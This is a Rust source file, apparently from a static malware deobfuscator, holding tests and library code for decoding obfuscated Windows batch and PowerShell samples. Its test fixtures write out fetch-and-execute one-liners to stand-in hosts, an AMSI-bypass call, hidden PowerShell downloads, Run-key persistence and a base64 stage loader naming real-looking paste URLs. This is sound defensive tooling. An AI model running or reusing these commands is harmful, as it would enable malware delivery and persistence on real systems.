        // delimiters. harrington's goto handler used to take `,;;;` as
        // the literal label and fail.
        let script = b"@echo off\r\nset X=before\r\ngoto ,;;; tgt\r\nset X=skipped\r\n:tgt\r\nset X=after\r\necho X=%X%\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("X=after"),
            "punctuation-prefixed goto didn't resolve: {:?}",
            report.deobfuscated
        );
        // No GotoUnresolved trait should fire for this label.
        assert!(
            !report.traits.iter().any(|t| matches!(
                t,
                Trait::GotoUnresolved { to_label, .. } if to_label.starts_with(',') || to_label.starts_with(';')
            )),
            "GotoUnresolved with punctuation label: {:?}",
            report.traits
        );
    }

    #[test]
    fn url_extraction_case_insensitive_and_liberal_slashes() {
        // Windows URL parsing (WinINet/IE/PS Invoke-WebRequest/curl.exe/
        // mshta/bitsadmin) is case-insensitive about the scheme AND
        // tolerates `\\` / `/` / `\/` / `////` after the colon.
        // Obfuscators exploit this to dodge naive `https://` scanners.
        // All variants below should extract.
        let script = b"@echo off\r\n\
            echo a hTtPs://evil1.example/p\r\n\
            echo b HTTP://evil2.example/p\r\n\
            echo c http:\\\\evil3.example/p\r\n\
            echo d https:\\evil4.example\\p\r\n\
            echo e https:////evil5.example/p\r\n\
            echo f hTtPs:\\/\\/evil6.example/p\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        let urls: Vec<String> = report
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. } => {
                    Some(src.clone())
                }
                _ => None,
            })
            .collect();
        for needle in &[
            "evil1.example",
            "evil2.example",
            "evil3.example",
            "evil4.example",
            "evil5.example",
            "evil6.example",
        ] {
            assert!(
                urls.iter().any(|u| u.contains(needle)),
                "missed URL with host {needle}; got {urls:?}"
            );
        }
    }

    #[test]
    fn url_in_ps_statement_chain_truncates_at_semicolon() {
        // PS one-liner `iex (iwr URL);Invoke-NullAMSI;function...`
        // — first_url_after used to return the URL with trailing
        // `);Invoke-NullAMSI;function` because split_words doesn't
        // split inside parens. Truncate at `;`/`)`/`,` etc.
        let script = b"@echo off\r\npowershell -c \"iex (iwr 'https://evil.example/x');Invoke-NullAMSI;function foo {}\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        for t in &report.traits {
            let url = match t {
                Trait::Download { src, .. } => src.as_str(),
                Trait::UrlArgument { url, .. } | Trait::UrlLaunch { url, .. } => url.as_str(),
                _ => continue,
            };
            if !url.contains("evil.example") {
                continue;
            }
            assert!(
                !url.contains("NullAMSI"),
                "URL bled into next PS stmt: {url} (trait={t:?})"
            );
            assert!(
                !url.contains(';') && !url.contains(')'),
                "URL has shell terminator: {url} (trait={t:?})"
            );
        }
    }

    #[test]
    fn cjk_prefixed_frombase64_does_not_panic() {
        // CJK-named vars (3-byte UTF-8) right before `[Convert]::FromBase64String`
        // must not make the fixed 32-byte look-back slice land mid-char — that
        // panicked `expand_convert_frombase64_literals` on a real corpus sample.
        let script =
            "powershell -Command \"set 尔尔尔尔尔尔尔尔尔尔=q;[System.Convert]::FromBase64String('SGVsbG8gV29ybGQ=')\"\r\n"
                .as_bytes();
        let report = analyze(script, &AnalyzeConfig::default());
        // Just must not panic; sanity-check it still produced output.
        assert!(!report.deobfuscated.is_empty());
    }

    #[test]
    fn leading_semicolon_prefix_set_is_dispatched() {
        // `@;@@@set "X=Y"` — CMD treats `;`/`@` as ignorable prefix. Char-
        // substitution packers build the `set` keyword this way; if `;`
        // isn't skipped, the var never gets defined and downstream
        // `%X:~N,1%` extractions silently drop (mangling recovered URLs).
        let script = b"@;@@@set \"deob_x=https://semi.example/p\"\r\necho %deob_x%\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("https://semi.example/p"),
            "leading-`;` set not dispatched: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn for_loop_with_ascii_noise_keyword_runs_body_set() {
        // `f%N1%o%N2%r /l %%i in (1,1,1) do ( set "Q=hit" )` — the FOR
        // keyword is split by ASCII-named empty noise vars; the body set
        // defines qvar. strip_for_header_noise must drop the unset noise
        // and run the body so qvar is captured.
        let script =
            b"@echo off\r\nf%aa%o%bb%r /l %%i in (1, 1, 1) do ( set \"qvar=DEFINED\" )\r\necho %qvar%\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("DEFINED"),
            "noise-keyword FOR body set not run: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn adjacent_var_refs_with_noise_resolve_each_char() {
        // `%a%%n1%%b%%n2%%c%` — adjacent single-letter defined vars with
        // empty noise between. The close `%` of one ref must not merge with
        // the open `%` of the next into a `%%`. Builds "xyz".
        let script = b"@echo off\r\nset a=x\r\nset b=y\r\nset c=z\r\nfor /l %%i in (1,1,1) do ( echo OUT:%a%%nz1%%b%%nz2%%c% )\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("OUT:xyz"),
            "adjacent var refs mis-resolved: {:?}",
            report.deobfuscated
        );
    }

    #[test]
    fn start_browser_url_is_extracted() {
        // `start "" firefox -url URL` form.
        let script = b"start \"\" firefox -url \"https://browser.example/x\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.traits.iter().any(|t| matches!(t,
                Trait::Download { src, .. } if src == "https://browser.example/x")),
            "start-browser URL not extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn unknown_redirected_command_does_not_emit_unresolved_pipeline() {
        let script = b"GIFTS WITH DISCOUNTS >nul 2>&1 LIMITED OFFER\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
            "unknown top-level redirects should not create for/f unresolved traits: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
mod cmd_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;

    #[test]
    fn cmd_c_extracts_inner_command() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"cmd /c "echo hi""#, &mut env);
        assert_eq!(env.exec_cmd, vec!["echo hi".to_string()]);
    }

    #[test]
    fn cmd_dot_exe_v_on_c_extracts() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"cmd.exe /v:on /c "set X=v&&echo !X!""#, &mut env);
        assert_eq!(env.exec_cmd, vec!["set X=v&&echo !X!".to_string()]);
    }
}

#[cfg(test)]
mod positional_tests {
    use crate::env::{Config, Environment, Frame};
    use crate::lex::lex;
    use crate::normalize::normalize_to_string;

    #[test]
    fn positional_arg_resolves_from_frame() {
        let mut env = Environment::new(&Config::default());
        env.call_stack.push(Frame {
            return_line: 0,
            args: vec!["first".into(), "second".into()],
            locals_snapshot: None,
        });
        assert_eq!(normalize_to_string(&lex("%1 %2"), &mut env), "first second");
    }

    #[test]
    fn all_args_resolves() {
        let mut env = Environment::new(&Config::default());
        env.call_stack.push(Frame {
            return_line: 0,
            args: vec!["a".into(), "b".into(), "c".into()],
            locals_snapshot: None,
        });
        assert_eq!(normalize_to_string(&lex("%*"), &mut env), "a b c");
    }

    #[test]
    fn percent_tilde_zero_renders_synthetic_path() {
        let mut env = Environment::new(&Config::default());
        let out = normalize_to_string(&lex("%~0"), &mut env);
        assert!(out.contains("script.bat"), "got: {}", out);
    }

    #[test]
    fn percent_tilde_n_arg_unset_is_empty() {
        let mut env = Environment::new(&Config::default());
        let out = normalize_to_string(&lex("%~1"), &mut env);
        assert_eq!(out, "");
    }
}

#[cfg(test)]
mod labels_tests {
    use crate::labels::build_label_index;

    #[test]
    fn finds_simple_labels() {
        let lines = vec![
            "echo a".to_string(),
            ":start".to_string(),
            "echo b".to_string(),
            ":done".to_string(),
        ];
        let idx = build_label_index(&lines);
        assert_eq!(idx.get("start"), Some(&1));
        assert_eq!(idx.get("done"), Some(&3));
    }

    #[test]
    fn double_colon_is_comment_not_label() {
        let lines = vec![":: this is a comment".to_string(), ":realLabel".to_string()];
        let idx = build_label_index(&lines);
        assert!(idx.contains_key("reallabel"));
        assert!(!idx.contains_key(":"));
        assert!(!idx.contains_key(": this is a comment"));
    }

    #[test]
    fn whitespace_before_label_allowed() {
        let lines = vec!["  :indented".to_string()];
        let idx = build_label_index(&lines);
        assert_eq!(idx.get("indented"), Some(&0));
    }

    #[test]
    fn label_with_trailing_garbage_uses_first_word() {
        let lines = vec![":target some other text".to_string()];
        let idx = build_label_index(&lines);
        assert_eq!(idx.get("target"), Some(&0));
    }
}

#[cfg(test)]
mod snapshot_tests {
    use crate::env::{Config, WinVer};
    use crate::synth::run_pipeline;
    use crate::Environment;

    #[test]
    fn win11_snapshot_has_more_assoc_than_fallback() {
        let mut env = Environment::new(&Config {
            winver: WinVer::Win11,
            ..Config::default()
        });
        let lines = run_pipeline("assoc", &mut env);
        // Win11 snapshot has 228 entries; hardcoded fallback has ~20
        assert!(
            lines.len() > 100,
            "expected snapshot to be loaded, got {} entries",
            lines.len()
        );
    }

    #[test]
    fn win10_falls_through_to_win11_snapshot() {
        // Snapshot::get used to return None for Win7/Win10 and we'd
        // fall through to a 20-entry hardcoded table in synth.rs. That
        // table is missing `Microsoft.PowerShellConsole.1` etc. that
        // the FE DOSfuscation FOR /F `ftype^|findstr lCo` gadget keys
        // off, so we now fall through to the Win11 snapshot instead.
        // The hardcoded fallback only fires when the Win11 JSON itself
        // fails to load (never, in practice).
        let mut env = Environment::new(&Config {
            winver: WinVer::Win10,
            ..Config::default()
        });
        let lines = run_pipeline("assoc", &mut env);
        assert!(
            lines.len() > 100,
            "expected Win11 fallthrough snapshot, got {} entries",
            lines.len()
        );
        assert!(lines.iter().any(|l| l.starts_with(".bat=")));
    }

    #[test]
    fn snapshot_assoc_lookup_specific_ext() {
        let mut env = Environment::new(&Config {
            winver: WinVer::Win11,
            ..Config::default()
        });
        let lines = run_pipeline("assoc .bat", &mut env);
        assert_eq!(lines.len(), 1);
        assert!(
            lines[0].to_ascii_lowercase().starts_with(".bat="),
            "got: {:?}",
            lines
        );
    }
}

#[cfg(test)]
mod for_f_misc_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn for_f_tokens_trailing_comma() {
        let script = br#"for /f "skip=0 tokens=3, delims= " %%a in ("a b c d") do echo got=%%a"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo got=c"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn for_f_unresolved_source_preserves_body() {
        let script = br#"for /f "tokens=*" %%a in ('reg query HKLM\Software') do echo got=%%a"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo got="),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn for_f_reads_redirected_synthetic_command_output() {
        let script = b"query session >session.txt\r\nfor /f \"skip=1 tokens=3,\" %%i in (session.txt) DO logoff %%i\r\ndel session.txt\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("logoff 1"),
            "deobf:\n{}\ntraits: {:?}",
            report.deobfuscated,
            report.traits
        );
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
            "redirected query output should resolve for /f source: {:?}",
            report.traits
        );
    }

    #[test]
    fn for_f_reads_common_inventory_command_output() {
        let script = b"for /f \"tokens=1\" %%i in ('ipconfig') do echo %%i\r\nfor /f \"tokens=1\" %%i in ('systeminfo') do echo %%i\r\nfor /f \"tokens=1\" %%i in ('getmac') do echo %%i\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("Windows")
                && report.deobfuscated.contains("Host")
                && report.deobfuscated.contains("00-11-22-33-44-55"),
            "deobf:\n{}\ntraits: {:?}",
            report.deobfuscated,
            report.traits
        );
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
            "inventory command output should resolve for /f source: {:?}",
            report.traits
        );
    }

    #[test]
    fn for_f_reads_version_and_powershell_inventory_output() {
        let script = concat!(
            "for /f \"tokens=4-5 delims=. \" %%i in ('ver') do set VERSION=%%i.%%j\r\n",
            "echo %VERSION%\r\n",
            "for /f \"tokens=*\" %%h in ('powershell -Command \"[System.Net.Dns]::GetHostName()\"') do echo host=%%h\r\n",
            "for /f \"tokens=*\" %%a in ('powershell -Command \"Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object -ExpandProperty displayName\" 2>nul') do echo av=%%a\r\n",
        );
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report.deobfuscated.contains("echo 10.0")
                && report.deobfuscated.contains("echo host=MISCREANTTEARS")
                && report
                    .deobfuscated
                    .contains("echo av=Microsoft Defender Antivirus"),
            "deobf:\n{}\ntraits: {:?}",
            report.deobfuscated,
            report.traits
        );
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
            "standard inventory commands should resolve: {:?}",
            report.traits
        );
    }

    #[test]
    fn for_f_reads_fsutil_dirty_query_output() {
        let script = b"for /f \"tokens=*\" %%d in ('fsutil dirty query C:') do echo dirty=%%d\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report
                .deobfuscated
                .contains("echo dirty=Volume - C: is NOT Dirty"),
            "deobf:\n{}\ntraits: {:?}",
            report.deobfuscated,
            report.traits
        );
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
            "fsutil dirty query should resolve: {:?}",
            report.traits
        );
    }

    #[test]
    fn for_f_pipeline_allows_echo_suppression_prefix() {
        let script = b"for /f \"tokens=*\" %%f in ('@find 2^>^&1') do echo %%f\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline.contains("@find"))),
            "echo-suppressed pipeline command should not be unresolved: {:?}",
            report.traits
        );
    }

    #[test]
    fn for_f_pipeline_allows_repeated_noise_prefixes() {
        let script = b"for /f \"tokens=*\" %%f in ('@;@find 2^>^&1') do echo %%f\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline.contains("find"))),
            "decorated pipeline command should not be unresolved: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
mod passthrough_tests {
    use crate::analyze;
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn del_emits_admin_command_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line("del /q /f C:\\temp\\evil.exe", &mut env);
        let has = env
            .traits
            .iter()
            .any(|t| matches!(t, Trait::AdminCommand { name, .. } if name == "del"));
        assert!(has, "no AdminCommand: {:?}", env.traits);
    }

    #[test]
    fn reg_emits_admin_command_trait() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            "reg add HKLM\\Software\\Run /v Evil /d C:\\evil.exe",
            &mut env,
        );
        let has = env
            .traits
            .iter()
            .any(|t| matches!(t, Trait::AdminCommand { name, .. } if name == "reg"));
        assert!(has, "no AdminCommand: {:?}", env.traits);
    }

    #[test]
    fn attrib_hidden_system_emits_file_concealment_trait() {
        let script = b"@echo off\r\n\
attrib +h +s \"C:\\Users\\Public\\stage.vbs\" >nul 2>&1\r\n\
attrib \"C:\\Users\\Public\\payload.exe\" +r +a +s +h\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::FileConcealment {
                    target,
                    attributes,
                    ..
                } if target.ends_with("stage.vbs")
                    && attributes.iter().any(|a| a == "hidden")
                    && attributes.iter().any(|a| a == "system")
            )),
            "missing leading-attribute concealment trait: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::FileConcealment {
                    target,
                    attributes,
                    ..
                } if target.ends_with("payload.exe")
                    && attributes.iter().any(|a| a == "hidden")
                    && attributes.iter().any(|a| a == "system")
            )),
            "missing trailing-attribute concealment trait: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
mod ps_positional_fallback_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;

    #[test]
    fn powershell_positional_iwr_captured() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            "powershell invoke-webrequest -uri http://x.example/y.exe -outfile c.exe",
            &mut env,
        );
        assert_eq!(env.exec_ps1.len(), 1, "no ps1 payload captured");
        let stored = String::from_utf8_lossy(&env.exec_ps1[0]);
        assert!(stored.contains("invoke-webrequest"), "got: {}", stored);
        assert!(
            stored.contains("x.example/y.exe"),
            "URL missing: {}",
            stored
        );
    }

    #[test]
    fn powershell_meta_flags_skip_and_positional_captured() {
        let mut env = Environment::new(&Config::default());
        interpret_line("powershell -windowstyle hidden -ExecutionPolicy Bypass invoke-webrequest -uri http://x.example/y.exe -outfile c.exe", &mut env);
        assert_eq!(env.exec_ps1.len(), 1, "no ps1 payload captured");
        let stored = String::from_utf8_lossy(&env.exec_ps1[0]);
        assert!(
            stored.contains("invoke-webrequest"),
            "payload missing cmd: {}",
            stored
        );
        assert!(
            stored.contains("x.example/y.exe"),
            "URL missing: {}",
            stored
        );
    }
}

#[cfg(test)]
mod ps_iwr_variants_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};
    use base64::Engine;

    fn encode(payload: &str) -> String {
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn iwr_alias_quoted_url() {
        let ps = r#"IWR -Uri "http://x.example/a.exe" -OutFile a.exe"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("x.example/a.exe")
            )
        });
        assert!(has, "iwr alias missed: {:?}", report.traits);
    }

    #[test]
    fn wget_alias_url() {
        let ps = r#"wget http://x.example/b.exe -OutFile b.exe"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("x.example/b.exe")
            )
        });
        assert!(has, "wget alias missed: {:?}", report.traits);
    }

    #[test]
    fn iwr_unquoted_url() {
        let ps = r#"Invoke-WebRequest -Uri http://x.example/c.exe -OutFile c.exe"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("x.example/c.exe")
            )
        });
        assert!(has, "unquoted URL missed: {:?}", report.traits);
    }

    #[test]
    fn multiple_iwr_commands_keep_their_own_outfile() {
        let ps = r#"IWR -Uri "http://x.example/a.pdf" -OutFile "$env:temp\a.pdf" ; IWR -Uri "http://x.example/b.exe" -OutFile "$env:temp\b.exe""#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has_pdf = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://x.example/a.pdf"
                        && dst.as_deref() == Some("$env:temp\\a.pdf")
            )
        });
        let has_exe = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://x.example/b.exe"
                        && dst.as_deref() == Some("$env:temp\\b.exe")
            )
        });
        assert!(
            has_pdf && has_exe,
            "multiple IWR extraction lost URL/dst pairing: {:?}",
            report.traits
        );
    }

    #[test]
    fn powershell_with_meta_flags_then_positional() {
        let script = b"powershell -windowstyle hidden -ExecutionPolicy Bypass invoke-webrequest -uri http://x.example/y.exe -outfile c.exe\r\n";
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("x.example/y.exe")
            )
        });
        assert!(
            has,
            "no Download trait from positional IWR: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
mod ps_getstring_unwrap_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};
    use base64::Engine;

    fn encode_utf16(payload: &str) -> String {
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn getstring_b64_chain_resolves_url() {
        let url_b64 =
            base64::engine::general_purpose::STANDARD.encode(b"http://evil.example/mego.bat");
        let ps = format!(
            r#"$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{}')); Invoke-WebRequest -Uri $u -OutFile c.bat"#,
            url_b64
        );
        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(&ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.example/mego.bat")
            )
        });
        assert!(has, "GetString b64 chain missed: {:?}", report.traits);
    }

    #[test]
    fn nested_start_process_regex_replace_b64_chain_resolves_urls() {
        let decoded = r#"
$k=@(('https://yaso.su/raw/UpxC8OJX'),('https://pastefy.app/sLC7Jpkp/raw'))
Invoke-WebRequest -Uri $k[0] -OutFile stage.bin
"#;
        let utf16: Vec<u8> = decoded
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD
            .encode(&utf16)
            .replace('r', "f#");
        let ps = format!(
            r#"Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-Command "$ddsdgo = ''{b64}'';$x=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([regex]::Replace($ddsdgo, ''f#'', ''r'')));iex $x"'"#
        );
        let script = format!("powershell -Command \"{}\"\r\n", ps.replace('"', "\\\""));
        let report = analyze(script.as_bytes(), &Config::default());
        let urls: Vec<_> = report
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::Download { src, .. } | Trait::UrlVariable { url: src, .. } => {
                    Some(src.as_str())
                }
                _ => None,
            })
            .collect();
        assert!(
            urls.contains(&"https://yaso.su/raw/UpxC8OJX")
                && urls.contains(&"https://pastefy.app/sLC7Jpkp/raw"),
            "nested regex-replaced b64 stage URLs missed: {:?}\ndeob:\n{}",
            report.traits,
            report.extracted_ps1_normalized.join("\n---\n")
        );
    }
}

#[cfg(test)]
mod start_title_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn start_quoted_title_then_powershell() {
        let script = b"start \"\" /min powershell -Command \"Invoke-WebRequest http://x.example/d.exe -OutFile d.exe\"\r\n";
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("x.example/d.exe")
            )
        });
        assert!(has, "start title broke chain: {:?}", report.traits);
    }
}

pub use env::{Config, Environment, WinVer};
pub use traits::Trait;

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct Report {
    pub deobfuscated: String,
    pub traits: Vec<Trait>,
    pub extracted_cmd: Vec<String>,
    pub extracted_ps1: Vec<Vec<u8>>,
    pub extracted_ps1_normalized: Vec<String>,
    /// Recovered PE blobs from AES-chain droppers, paired with a short
    /// human-readable label (e.g. `"ps-aes-stage1-asm0"`). The CLI's
    /// `write_report_files` writes each as `<sha>.<ext>` so analysts
    /// can pull the `.exe`/`.dll` for sandbox or static RE follow-up.
    pub recovered_pe: Vec<(String, Vec<u8>)>,
}

// Some `.bat` polyglots wrap a `<script language="JScript|VBScript">...</script>`
// block inside a `/* ... */` comment range that CMD's parser skips. The
// JScript is invoked separately via `mshta "%~f0"`. CMD's drive() won't
// see the inner code, so URLs inside (e.g. `objShell.Run("\\\\host@SSL\\..")`)
// would never reach trait extraction. Pre-scan and push any script block
// payload onto `all_extracted_jscript` so `scan_js_payloads` walks it.
fn pre_scan_polyglot_script_block(input: &[u8], env: &mut Environment) {
    let text = String::from_utf8_lossy(input);
    let lower = text.to_ascii_lowercase();
    let mut idx = 0usize;
    while let Some(open) = lower[idx..].find("<script") {
        let abs_open = idx + open;
        // find the closing `>` of the opening tag
        let Some(tag_end_rel) = lower[abs_open..].find('>') else {
            break;
        };
        let body_start = abs_open + tag_end_rel + 1;
        // matching `</script>` (case-insensitive)
        let Some(close_rel) = lower[body_start..].find("</script>") else {
            break;
        };
        let body_end = body_start + close_rel;
        let body = &text[body_start..body_end];
        if !body.trim().is_empty() {
            env.all_extracted_jscript.push(body.as_bytes().to_vec());
        }
        idx = body_end + "</script>".len();
    }
}

fn pre_scan_utf16_script_blob(decoded: &str, env: &mut Environment) {
    let lower = decoded.to_ascii_lowercase();
    let looks_vbs = lower.contains("createobject")
        || lower.contains("wscript")
        || lower.contains("xmlhttp")
        || lower.contains("private function")
        || lower.contains("option explicit")
        || lower.contains("\ndim ")
        || lower.starts_with("dim ");
    let looks_js = lower.contains("activexobject")
        || lower.contains("<script")
        || lower.contains("document.")
        || lower.contains("window.")
        || lower.contains("function ")
        || lower.contains("var ")
        || lower.contains("eval(");

    if looks_vbs {
        let payload = decoded.as_bytes().to_vec();
        if !env
            .all_extracted_vbs
            .iter()
            .any(|existing| existing == &payload)
        {
            env.all_extracted_vbs.push(payload);
        }
    }
    if looks_js {
        let payload = decoded.as_bytes().to_vec();
        if !env
            .all_extracted_jscript
            .iter()
            .any(|existing| existing == &payload)
        {
            env.all_extracted_jscript.push(payload);
        }
    }
}

fn decode_utf16le_script_blob(input: &[u8]) -> Option<String> {
    /// Hard cap on attacker-supplied UTF-16LE blob size. Without this, a
    /// library consumer (the CLI applies its own input cap but downstream
    /// callers may not) could feed a 1 GB pseudo-UTF-16 blob and force a
    /// ~1 GB Vec<u16> + ~3 GB String::from_utf16_lossy transient.
    const MAX_UTF16_DECODE_BYTES: usize = 16 * 1024 * 1024;
    if input.len() > MAX_UTF16_DECODE_BYTES {
        return None;
    }
    if !looks_like_utf16le(input) {
        return None;
    }
    let u16s: Vec<u16> = input
        .chunks_exact(2)
        .map(|b| u16::from_le_bytes([b[0], b[1]]))
        .collect();
    let decoded = String::from_utf16_lossy(&u16s);
    let lower = decoded.to_ascii_lowercase();
    let looks_script = lower.contains("createobject")
        || lower.contains("wscript")
        || lower.contains("xmlhttp")
        || lower.contains("private function")
        || lower.contains("option explicit")
        || lower.contains("<script")
        || lower.contains("activexobject")
        || lower.contains("function ")
        || lower.contains("var ")
        || lower.contains("eval(");
    if looks_script {
        Some(decoded)
    } else {
        None
    }
}

fn looks_like_utf16le(bytes: &[u8]) -> bool {
    if bytes.len() < 4 {
        return false;
    }
    let pairs = bytes.len() / 2;
    let even_nonzero = bytes.iter().step_by(2).filter(|b| **b != 0).count();
    let odd_zero = bytes.iter().skip(1).step_by(2).filter(|b| **b == 0).count();
    even_nonzero * 2 >= pairs && odd_zero * 2 >= pairs
}

/// Statically deobfuscate a Windows batch / cmd / PowerShell / VBS / JScript
/// sample and return a [`Report`] of recovered IOCs, the deobfuscated text,
/// and any extracted child payloads.
///
/// The engine **never executes** the input. All recovery is symbolic:
/// variable resolution, FOR-loop interpretation, base64/hex/AES decoding,
/// and pattern-matched IOC extraction.
///
/// # Inputs
///
/// `input` is raw bytes — UTF-8 is the common case, UTF-16LE script blobs
/// are auto-detected, and PE-prefixed `.bat` files (droppers that prepend
/// `MZ`) are routed through the binary URL scanner.
///
/// # Bounded execution
///
/// Every analysis run honors the limits in [`Config`]: wall-clock
/// `timeout_secs`, recursion `max_depth`, FOR-loop `max_iterations`,
/// recursive `max_child_scripts`, output `max_output_bytes`, per-line
/// `max_output_line_bytes`, and per-kind `max_traits_per_kind`. When a
/// cap fires, a `Trait::*Capped` / `Trait::TimeoutHit` /
/// `Trait::LineTruncated` / `Trait::OutputCapped` variant is emitted so
/// callers can see soft-failure rather than guessing why output is short.
///
/// `analyze` is **infallible**: there is no `Result` — failures surface
/// as trait variants, never as panics or returned errors. This is a
/// load-bearing contract for batch-triage pipelines that process
/// untrusted samples.
///
/// # Returns
///
/// A [`Report`] with the deobfuscated text, typed traits (IOCs +
/// structural signals + caps), and extracted child cmd/ps1 payloads
/// (raw bytes plus a normalized form for the ps1 cases).
pub fn analyze(input: &[u8], cfg: &Config) -> Report {
    analyze_inner(input, cfg, None)
}

/// Analyze a sample while also providing its original filesystem path.
///
/// This lets `%~f0`/`%~n0`/`%~nx0` style self references resolve to the
/// caller's real input name for self-extracting chains.
pub fn analyze_with_path(
    input: &[u8],
    cfg: &Config,
    file_path: impl AsRef<std::path::Path>,
) -> Report {
    analyze_inner(input, cfg, Some(file_path.as_ref().to_path_buf()))
}

fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBuf>) -> Report {
    let profile_enabled = std::env::var_os("HARRINGTON_PROFILE").is_some();
    let profile_start = std::time::Instant::now();
    let mut profile_last = profile_start;
    macro_rules! profile_mark {
        ($stage:literal) => {
            if profile_enabled {
                let now = std::time::Instant::now();
                eprintln!(
                    "harrington_profile stage={} delta_ms={} total_ms={}",
                    $stage,
                    now.duration_since(profile_last).as_millis(),
                    now.duration_since(profile_start).as_millis()
                );
                profile_last = now;
            }
        };
    }
    let mut env = Environment::new(cfg);
    env.file_path = file_path;
    if cfg.self_extract {
        env.input_bytes = Some(std::sync::Arc::from(input));
    }
    let mut out = String::new();
    // FE-DOSfuscation pattern: scripts that reference `!VAR!` without an
    // explicit `setlocal enabledelayedexpansion` are almost certainly meant
    // to run under `cmd /v:on` (the FireEye DOSfuscation report's
    // test_echo_pipe / test_call_var cases match this). 173/1187 corpus
    // .bat samples use this pattern; refusing to expand `!X!` leaves
